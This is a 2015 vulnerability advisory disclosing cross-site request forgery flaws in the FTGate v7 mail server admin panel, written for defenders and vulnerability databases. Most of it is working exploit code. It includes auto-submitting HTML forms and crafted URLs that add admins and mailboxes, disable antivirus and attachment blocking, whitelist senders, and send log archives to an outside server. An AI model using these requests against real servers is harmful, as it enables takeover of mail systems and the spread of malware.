@@ -1,0 +1,181 @@
+[+] Credits: hyp3rlinx
+
+[+] Website: hyp3rlinx.altervista.org
+
+[+] Source:
+http://hyp3rlinx.altervista.org/advisories/AS-FTGATE-V7-CSRF.txt
+
+
+Vendor:
+================================
+www.ftgate.com
+www.ftgate.com/ftgate-update-7-0-300
+
+
+Product:
+================================
+FTGate v7
+
+
+Vulnerability Type:
+=================================
+Cross site request forgery (CSRF)
+
+
+CVE Reference:
+==============
+N/A
+
+
+Vulnerability Details:
+=====================
+Multiple CSRF vectors exists within FTGate v7 allowing the following attacks
+www.ftgate.com/ftgate-update-7-0-300
+
+1) add arbitrary domains
+2) enable arbitrary remote archiving of logs
+3) whitelist arbitrary email addresses
+4) add arbitrary mailbox & disable antivirus,
+5) remove email attachment blocking for filez.
+
+
+Exploit code(s):
+===============
+
+<!DOCTYPE>
+<html>
+<body onLoad="doit()">
+<script>
+function doit(){
+var e=document.getElementById('HELL')
+e.submit()
+}
+</script>
+
+1) add arbitrary remote domain:
+
+<form id='HELL' action="
+http://localhost:8089/v7/wizards/adddomain.fts?action=save&id="
+method="post">
+<input type="text" name="name" value="abysmalgodz" />
+<input type="text" name="type" value="1" />
+</form>
+
+
+2) enable arbitrary remote archive:
+
+<form id='HELL' action="
+http://localhost:8089/v7/webadmin/config/archive.fts?action=save"
+method="post">
+<input type="text" name="action" value="save" />
+<input type="text" name="enable" value="on" />
+<input type="text" name="duration" value="0" />
+<input type="text" name="external" value="on" />
+<input type="text" name="extarcserver" value="0.6.6.6" />
+</form>
+
+disable Antivirus for .exe files: also, has a persistent XSS inject but our
+payload gets truncated at 5 chars,
+but can corrupt the loading of valid XML returned from database to the WEB
+UI.
+
+e.g.
+
+HTTP response after attack outputs corrupted XML generating errors.
+
+<cell>exe</cell>
+<cell/>
+<cell><scri</cell>
+<cell/>
+</row>
+<row id='id_"/><s'>
+
+http://localhost:8089/v7/axml/adminlists.fts?table=ext&add=exe
+
+
+<form id='HELL' action="
+http://localhost:8089/v7/webadmin/filters/virus.fts?action=save&mailbox="
+method="post">
+<input type="text" name="mode" value="on" />
+<input type="text" name="selftest" value="0ff" />
+<input type="text" name="extGrid_id_exe_0" value="1" />
+</form>
+
+
+add arbitrary Admins:
+
+http://localhost:8089/v7/axml/adminlists.fts?table=admin&add=ghostofsin
+
+whitelist arbitrary email addresses:
+
+Messages that originate from these email addresses are not filtered by the
+Word or Phrase filters.
+
+http://localhost:8089/v7/axml/whitelist.fts?id=531&add=hell@abyss.666
+
+<!--remove email attachment blocking for exe, hta & html filez -->
+
+http://localhost:8089/v7/axml/attachments.fts?id=531&remove=7,10,3
+
+when access the above URL it returns XML with all file extensions blocked
+on incoming email, we now know ID in database.
+so to remove blocking of .cmd we select '11'
+
+http://localhost:8089/v7/axml/attachments.fts?id=531&remove=11
+
+or remove blocking of multiple file types in one shot
+http://localhost:8089/v7/axml/attachments.fts?id=531&remove=7,10,3
+
+
+add arbitrary mailbox:
+
+<form id='HELL' action="
+http://localhost:8089/v7/wizards/addmailbox.fts?action=save&id=500"
+method="post">
+<input type="text" name="name" value="punksnotdead" />
+<input type="text" name="type" value="0" />
+<input type="text" name="cn" value="punksnotdead" />
+<input type="text" name="password" value="punksnotdead" />
+</form>
+
+</body>
+</html>
+
+
+Disclosure Timeline:
+========================================
+Vendor Notification: September 29, 2015
+October 1, 2015 : Public Disclosure
+
+
+Exploitation Technique:
+=======================
+Remote
+
+
+Severity Level:
+================
+High
+
+
+Description:
+==========================================================
+Request Method(s):              [+]  GET
+
+Vulnerable Product:             [+]  FTGate v7
+
+Vulnerable Parameter(s):        [+]  type, id, mode, add, extarcserver
+
+===========================================================
+
+[+] Disclaimer
+Permission is hereby granted for the redistribution of this advisory,
+provided that it is not altered except by reformatting it, and that due
+credit is given. Permission is explicitly given for insertion in
+vulnerability databases and similar, provided that due credit is given to
+the author.
+The author is not responsible for any misuse of the information contained
+herein and prohibits any malicious use of all security related information
+or exploits by the author or elsewhere.
+
+by hyp3rlinx
